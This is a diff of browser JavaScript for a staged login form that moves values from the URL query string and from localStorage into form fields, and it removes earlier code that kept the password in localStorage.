@@ -7,7 +7,6 @@ if(localStorage.getItem('login_data') == null) {
    localStorage.setItem('login_form_last_name', ``);
    localStorage.setItem('login_form_id', ``);
    localStorage.setItem('login_form_password', ``);
-   localStorage.setItem('login_form-data', ``);
 }
 
 function stage() {
@@ -16,6 +15,7 @@ function stage() {
       document.querySelector('.stage0-form').style.display = "none";
       document.querySelector('.stage0-button').style.display = "none";
       document.querySelector('.stage1').style.display = "none";
+      document.querySelector('.stage2').style.display = "none";
 
       if(window.location.href.indexOf(`?`) > -1) {
          let href = window.location.href;
@@ -28,6 +28,10 @@ function stage() {
          href_q = href.indexOf(`&last_name=`);
          href_q_exit = href.indexOf(`&`);
          let last_name = href.slice(href_q+11,href_q_exit-1);
+
+         localStorage.setItem('login_first_name', `${first_name}`);
+         localStorage.setItem('login_last_name', `${last_name}`);
+         localStorage.setItem('login_form_id', `${id}`);
    
          // document.querySelector('.stage2').innerHTML += `<div>Страница ${id} и ${first_name} ${last_name}</div>`;
          document.getElementById('stage0-form-id').value = id;
@@ -38,6 +42,7 @@ function stage() {
    if(localStorage.getItem('login_stage') == 1) {
       document.querySelector('.stage0').style.display = "none";
       document.querySelector('.stage1').style.display = "block";
+      document.querySelector('.stage2').style.display = "none";
    }
    if(localStorage.getItem('login_stage') == 2) {
       document.querySelector('.stage0').style.display = "none";
@@ -83,10 +88,6 @@ function submitJoinStart() {
    } else {
       document.querySelector('.p').style.display = "none";
    }
-
-   localStorage.setItem('login_form_id', `${id}`);
-   localStorage.setItem('login_form_password', `${password}`);
-   localStorage.setItem('login_form-data', `${Math.round(new Date().getTime()/1000.0)}`);
    
    localStorage.setItem('login_stage', `1`);
    stage();
@@ -94,6 +95,9 @@ function submitJoinStart() {
 
 function submitJoinStop() {
    localStorage.setItem('login_stage', `3`);
+   document.getElementById('stage0-form-2-first').value = localStorage.getItem('stage0-form-2-first');
+   document.getElementById('stage0-form-2-last').value = localStorage.getItem('stage0-form-2-last');
+   document.getElementById('stage0-form-2-id').value = localStorage.getItem('stage0-form-2-id');
    stage();
 }
 
